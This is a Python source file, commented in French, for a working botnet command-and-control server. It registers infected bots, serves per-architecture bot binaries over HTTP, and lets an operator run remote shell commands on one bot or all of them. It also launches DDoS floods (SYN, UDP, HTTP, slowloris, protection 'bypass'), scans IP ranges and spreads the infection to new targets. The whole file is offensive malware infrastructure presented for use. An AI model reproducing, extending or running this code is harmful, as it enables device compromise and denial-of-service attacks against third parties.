#!/usr/bin/env python3
import socket
import threading
import time
import sys
import os
import http.server
import socketserver
from urllib.parse import urlparse, parse_qs
import random
import string

# Configuration
HOST = '0.0.0.0'  # Écoute sur toutes les interfaces
PORT = 1337       # Port d'écoute pour le C2
HTTP_PORT = 80    # Port pour servir les fichiers binaires
MAX_CONNECTIONS = 900
BINARIES_DIR = os.path.dirname(os.path.abspath(__file__))  # Répertoire contenant les binaires

# Liste pour stocker les bots connectés
connected_bots = []
lock = threading.Lock()

# Statistiques
total_infections = 0
total_commands = 0
active_ddos = 0

# Dictionnaire des méthodes d'attaque DDoS disponibles
DDOS_METHODS = {
    # Layer 4 (Transport)
    "syn": "Flood SYN - Inonde la cible de paquets SYN sans compléter le handshake TCP",
    "ack": "Flood ACK - Envoie des paquets ACK sans connexion préalable",
    "udp": "Flood UDP - Inonde la cible de paquets UDP",
    "tcp": "Flood TCP - Établit de nombreuses connexions TCP",
    "icmp": "Flood ICMP - Envoie des paquets ICMP en masse (ping flood)",
    
    # Layer 7 (Application)
    "http": "Flood HTTP - Envoie des requêtes HTTP GET/POST en masse",
    "slowloris": "Slowloris - Garde des connexions HTTP ouvertes le plus longtemps possible",
    "rudy": "R-U-Dead-Yet - Soumet des formulaires POST très lentement",
    "arme": "ARME - Attaque par amplification de réflexion de mémoire",
    "hulk": "HULK - Génère du trafic HTTP unique pour contourner le cache",
    
    # Mixtes
    "mix": "Mix - Combinaison de plusieurs attaques simultanées",
    "bypass": "Bypass - Tente de contourner les protections WAF et anti-DDoS"
}

def handle_bot(client_socket, address):
    """Gère la connexion d'un bot individuel"""
    global total_infections, active_ddos
    # Réduire les logs de connexion
    if len(connected_bots) % 10 == 0:  # Log toutes les 10 connexions
        print(f"[+] {len(connected_bots)} bots connectés - Dernier: {address[0]}")
    
    # Informations sur le bot
    bot_info = {
        'ip': address[0],
        'port': address[1],
        'connected_time': time.strftime('%Y-%m-%d %H:%M:%S'),
        'socket': client_socket,
        'arch': 'unknown',
        'hostname': 'unknown',
        'system_info': '',
        'tasks': []
    }
    
    try:
        # Réception du message d'identification
        data = client_socket.recv(1024).decode('utf-8', errors='ignore')
        
        if data:
            print(f"[*] Message du bot {address[0]}: {data.strip()}")
            
            # Analyser les informations du bot
            if 'BOT_CONNECTED' in data:
                total_infections += 1
                parts = data.split('|', 1)
                if len(parts) > 1:
                    bot_info['system_info'] = parts[1].strip()
                    
                    # Extraire le nom d'hôte et l'architecture si disponibles
                    if 'Hostname:' in bot_info['system_info']:
                        hostname_line = bot_info['system_info'].split('\n')[0]
                        bot_info['hostname'] = hostname_line.split('Hostname:')[1].strip()
                    
                    # Détecter l'architecture
                    if 'mips' in bot_info['system_info'].lower():
                        bot_info['arch'] = 'mips'
                    elif 'arm' in bot_info['system_info'].lower():
                        bot_info['arch'] = 'arm'
                    elif 'x86_64' in bot_info['system_info'].lower():
                        bot_info['arch'] = 'x86_64'
                    elif 'x86' in bot_info['system_info'].lower():
                        bot_info['arch'] = 'x86'
            
            # Ajouter le bot à la liste des connectés
            with lock:
                connected_bots.append(bot_info)
                print(f"[+] Bot ajouté à la liste. Total: {len(connected_bots)}")
            
            # Envoyer un ping initial pour vérifier la connexion
            client_socket.send("PING".encode('utf-8'))
        
        # Boucle pour maintenir la connexion et recevoir d'autres messages
        while True:
            try:
                data = client_socket.recv(1024).decode('utf-8', errors='ignore')
                if not data:
                    break
                
                # Traiter les réponses du bot
                if data.startswith("SCAN_RESULT|"):
                    print(f"[+] Résultats de scan de {address[0]}: {data.split('|')[1]}")
                elif data.startswith("DDOS_STARTED|"):
                    active_ddos += 1
                    parts = data.split('|')
                    print(f"[+] Attaque DDoS démarrée contre {parts[1]} pour {parts[2]}")
                elif data.startswith("PROPAGATION|"):
                    parts = data.split('|')
                    print(f"[+] Tentative de propagation vers {parts[1]}: {parts[2]}")
                elif data == "PONG":
                    # Ping réussi, le bot est toujours actif
                    pass
                else:
                    print(f"[*] Message du bot {address[0]}: {data.strip()}")
            except Exception as e:
                print(f"[!] Erreur de communication avec {address[0]}: {str(e)}")
                break
    
    except Exception as e:
        print(f"[!] Erreur avec le bot {address[0]}: {str(e)}")
    
    finally:
        # Supprime le bot de la liste quand il se déconnecte
        with lock:
            for i, bot in enumerate(connected_bots):
                if bot['socket'] == client_socket:
                    # Si le bot était en train de faire un DDoS, décrémenter le compteur
                    if any(task.startswith("DDOS") for task in bot['tasks']):
                        active_ddos -= 1
                    connected_bots.pop(i)
                    break
        
        print(f"[-] Bot {address[0]} déconnecté. Total restant: {len(connected_bots)}")
        client_socket.close()

# Classe pour servir les fichiers binaires via HTTP
class BinaryHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=BINARIES_DIR, **kwargs)
    
    def log_message(self, format, *args):
        # Journalisation personnalisée pour les téléchargements de binaires
        if "GET /bot." in args[0]:
            print(f"[+] Téléchargement de {args[0].split()[1]} par {self.client_address[0]}")
    
    def do_GET(self):
        # Servir les fichiers binaires
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

# Envoyer une commande à un bot spécifique
def send_command_to_bot(bot_index, command):
    global total_commands, active_ddos
    try:
        with lock:
            if bot_index < 0 or bot_index >= len(connected_bots):
                print("[!] Index de bot invalide")
                return False
            
            bot = connected_bots[bot_index]
            bot['socket'].send(command.encode('utf-8'))
            
            # Enregistrer la commande dans l'historique du bot
            if not command == "PING":
                bot['tasks'].append(command)
                total_commands += 1
            
            print(f"[+] Commande envoyée à {bot['ip']} ({bot['hostname']})")
            return True
    except Exception as e:
        print(f"[!] Erreur lors de l'envoi de la commande: {str(e)}")
        return False

# Envoyer une commande à tous les bots
def broadcast_command(command):
    success_count = 0
    with lock:
        if not connected_bots:
            print("[!] Aucun bot connecté")
            return 0
        
        for i in range(len(connected_bots)):
            if send_command_to_bot(i, command):
                success_count += 1
    
    print(f"[+] Commande envoyée à {success_count}/{len(connected_bots)} bots")
    return success_count

# Afficher la bannière du serveur C2
def print_banner():
    # Utiliser r pour les chaînes brutes (raw strings) afin d'éviter les problèmes d'échappement
    banner = r"""
    ____        _            _     ____ ____  
   | __ )  ___ | |_ _ __   ___| |_  / ___|___ \ 
   |  _ \ / _ \| __| '_ \ / _ \ __|| |     __) |
   | |_) | (_) | |_| | | |  __/ |_ | |___ / __/ 
   |____/ \___/ \__|_| |_|\___|\__(_)____|_____|  
                                                 
    """
    print(banner)
    print("=== Serveur de Commande et Contrôle ===\n")

# Interface utilisateur du serveur C2
def command_interface():
    """Interface utilisateur pour contrôler les bots"""
    global active_ddos, total_commands
    print_banner()
    
    while True:
        print("\nCommandes disponibles :")
        print("1. list - Liste tous les bots connectés")
        print("2. info <id> - Affiche les informations détaillées d'un bot")
        print("3. cmd <id> <commande> - Exécute une commande shell sur un bot spécifique")
        print("4. broadcast <commande> - Exécute une commande sur tous les bots")
        print("5. ddos <id> <cible> <durée> [méthode] - Lance une attaque DDoS avec un bot")
        print("6. ddos-all <cible> <durée> [méthode] - Lance une attaque DDoS avec tous les bots")
        print("7. scan <id> <plage> - Scanner une plage d'adresses IP")
        print("8. propagate <id> <cible> - Tente de se propager vers une cible")
        print("9. status - Affiche les statistiques du botnet")
        print("10. clear - Efface l'écran")
        print("11. exit - Arrête le serveur C2")
        print("\nMéthodes DDoS disponibles:")
        for method, desc in DDOS_METHODS.items():
            print(f"- {method.ljust(10)} : {desc}")
        
        print(f"\nBots connectés: {len(connected_bots)} | Infections: {total_infections} | Attaques actives: {active_ddos}")
        
        cmd = input("\n> ")
        cmd_parts = cmd.strip().split()
        
        if not cmd_parts:
            continue
        
        # Traiter la commande
        if cmd_parts[0] == "list":
            with lock:
                if not connected_bots:
                    print("[*] Aucun bot connecté")
                else:
                    print("\n=== Bots connectés ===")
                    for i, bot in enumerate(connected_bots):
                        print(f"{i}. IP: {bot['ip']} | Hostname: {bot['hostname']} | Arch: {bot['arch']} | Connecté depuis: {bot['connected_time']}")
                    print(f"Total: {len(connected_bots)}")
        
        elif cmd_parts[0] == "info" and len(cmd_parts) > 1:
            try:
                bot_index = int(cmd_parts[1])
                with lock:
                    if bot_index < 0 or bot_index >= len(connected_bots):
                        print("[!] Index de bot invalide")
                    else:
                        bot = connected_bots[bot_index]
                        print(f"\n=== Informations du bot {bot_index} ===")
                        print(f"IP: {bot['ip']}")
                        print(f"Hostname: {bot['hostname']}")
                        print(f"Architecture: {bot['arch']}")
                        print(f"Connecté depuis: {bot['connected_time']}")
                        print(f"Informations système:\n{bot['system_info']}")
                        print(f"Tâches récentes: {', '.join(bot['tasks'][-5:]) if bot['tasks'] else 'Aucune'}")
            except ValueError:
                print("[!] Index de bot invalide")
        
        elif cmd_parts[0] == "cmd" and len(cmd_parts) > 2:
            try:
                bot_index = int(cmd_parts[1])
                command = "EXEC " + " ".join(cmd_parts[2:])
                send_command_to_bot(bot_index, command)
            except ValueError:
                print("[!] Index de bot invalide")
        
        elif cmd_parts[0] == "broadcast" and len(cmd_parts) > 1:
            command = "EXEC " + " ".join(cmd_parts[1:])
            broadcast_command(command)
        
        elif cmd_parts[0] == "ddos" and len(cmd_parts) > 3:
            try:
                bot_index = int(cmd_parts[1])
                target = cmd_parts[2]
                duration = int(cmd_parts[3])
                method = cmd_parts[4] if len(cmd_parts) > 4 else "mix"
                
                if method not in DDOS_METHODS:
                    print(f"[!] Méthode invalide. Méthodes disponibles: {', '.join(DDOS_METHODS.keys())}")
                    continue
                
                if duration > 3600:  # Max 1 heure
                    print("[!] Durée maximum autorisée: 3600 secondes (1 heure)")
                    continue
                    
                command = f"DDOS {target} {duration} {method}"
                send_command_to_bot(bot_index, command)
                print(f"[+] Bot {bot_index} lance une attaque {method} contre {target}")
                
            except ValueError:
                print("[!] Format invalide. Utilisez: ddos <id> <cible> <durée> [méthode]")
                
        elif cmd_parts[0] == "ddos-all" and len(cmd_parts) > 2:
            try:
                target = cmd_parts[1]
                duration = int(cmd_parts[2])
                method = cmd_parts[3] if len(cmd_parts) > 3 else "mix"
                
                if method not in DDOS_METHODS:
                    print(f"[!] Méthode invalide. Méthodes disponibles: {', '.join(DDOS_METHODS.keys())}")
                    continue
                
                if duration > 3600:
                    print("[!] Durée maximum autorisée: 3600 secondes (1 heure)")
                    continue
                    
                command = f"DDOS {target} {duration} {method}"
                active_bots = len(connected_bots)
                broadcast_command(command)
                print(f"[+] Attaque {method} lancée avec {active_bots} bots contre {target}")
                
            except ValueError:
                print("[!] Format invalide. Utilisez: ddos-all <cible> <durée> [méthode]")
                
        elif cmd_parts[0] == "status":
            print("\n=== Statistiques du Botnet ===")
            print(f"Bots connectés: {len(connected_bots)}")
            print(f"Total des infections: {total_infections}")
            print(f"Attaques DDoS actives: {active_ddos}")
            print(f"Commandes exécutées: {total_commands}")
            
            # Afficher les architectures des bots connectés
            arch_count = {}
            for bot in connected_bots:
                arch = bot['arch']
                if arch in arch_count:
                    arch_count[arch] += 1
                else:
                    arch_count[arch] = 1
            
            if arch_count:
                print("\nArchitectures des bots:")
                for arch, count in arch_count.items():
                    print(f"- {arch}: {count}")
                
        elif cmd_parts[0] == "clear":
            os.system('cls' if os.name == 'nt' else 'clear')
            print_banner()
        
        elif cmd_parts[0] == "scan" and len(cmd_parts) > 2:
            try:
                bot_index = int(cmd_parts[1])
                subnet = cmd_parts[2]
                command = f"SCAN {subnet}"
                send_command_to_bot(bot_index, command)
            except ValueError:
                print("[!] Format invalide. Utilisez: scan <id> <plage>")
        
        elif cmd_parts[0] == "propagate" and len(cmd_parts) > 2:
            try:
                bot_index = int(cmd_parts[1])
                target = cmd_parts[2]
                command = f"PROPAGATE {target}"
                send_command_to_bot(bot_index, command)
            except ValueError:
                print("[!] Format invalide. Utilisez: propagate <id> <cible>")
        
        elif cmd_parts[0] == "ping" and len(cmd_parts) > 1:
            try:
                bot_index = int(cmd_parts[1])
                send_command_to_bot(bot_index, "PING")
            except ValueError:
                print("[!] Index de bot invalide")
        
        elif cmd_parts[0] == "ping-all":
            broadcast_command("PING")
        
        elif cmd_parts[0] == "kill" and len(cmd_parts) > 1:
            try:
                bot_index = int(cmd_parts[1])
                send_command_to_bot(bot_index, "EXIT")
            except ValueError:
                print("[!] Index de bot invalide")
        
        elif cmd_parts[0] == "exit":
            print("[!] Arrêt du serveur...")
            sys.exit(0)
        
        else:
            print("[!] Commande inconnue. Tapez 'help' pour voir les commandes disponibles.")

# Démarrer le serveur HTTP pour servir les fichiers binaires
def start_http_server():
    try:
        http_server = socketserver.ThreadingTCPServer((HOST, HTTP_PORT), BinaryHandler)
        print(f"[+] Serveur HTTP démarré sur {HOST}:{HTTP_PORT} pour servir les binaires")
        http_server.serve_forever()
    except Exception as e:
        print(f"[!] Erreur lors du démarrage du serveur HTTP: {str(e)}")
        if "Address already in use" in str(e):
            print("[!] Le port HTTP est déjà utilisé. Le serveur C2 fonctionnera sans serveur HTTP.")

# Vérifier les binaires disponibles
def check_binaries():
    binary_types = ['mips', 'arm', 'arm7', 'x86', 'x86_64', 'ppc', 'sh4', 'm68k', 'sparc']
    available_binaries = []
    missing_binaries = []
    
    for arch in binary_types:
        binary_path = os.path.join(BINARIES_DIR, f"bot.{arch}")
        if os.path.exists(binary_path):
            available_binaries.append(f"bot.{arch}")
        else:
            missing_binaries.append(f"bot.{arch}")
    
    if available_binaries:
        print("[+] Binaires disponibles:")
        for binary in available_binaries:
            print(f"    - {binary} ({os.path.getsize(os.path.join(BINARIES_DIR, binary))} octets)")
    
    if missing_binaries:
        print("[!] Binaires manquants (vous devriez les compiler):")
        for binary in missing_binaries:
            print(f"    - {binary}")

def main():
    """Fonction principale du serveur C2"""
    print("\n===== BOTNET C2 SERVER =====\n")
    print("[*] Vérification des binaires disponibles...")
    check_binaries()
    
    # Démarrer le serveur HTTP dans un thread séparé
    http_thread = threading.Thread(target=start_http_server)
    http_thread.daemon = True
    http_thread.start()
    
    # Démarrer le serveur C2
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((HOST, PORT))
        server.listen(MAX_CONNECTIONS)
        print(f"[+] Serveur C2 démarré sur {HOST}:{PORT}")
        
        # Démarrer l'interface utilisateur dans un thread séparé
        ui_thread = threading.Thread(target=command_interface)
        ui_thread.daemon = True
        ui_thread.start()
        
        # Boucle principale pour accepter les connexions
        while True:
            client_socket, address = server.accept()
            client_handler = threading.Thread(target=handle_bot, args=(client_socket, address))
            client_handler.daemon = True
            client_handler.start()
    
    except KeyboardInterrupt:
        print("\n[!] Arrêt du serveur...")
    
    except Exception as e:
        print(f"[!] Erreur: {str(e)}")
    
    finally:
        # Ferme toutes les connexions
        with lock:
            for bot in connected_bots:
                try:
                    bot['socket'].close()
                except:
                    pass
        
        server.close()

if __name__ == "__main__":
    main()
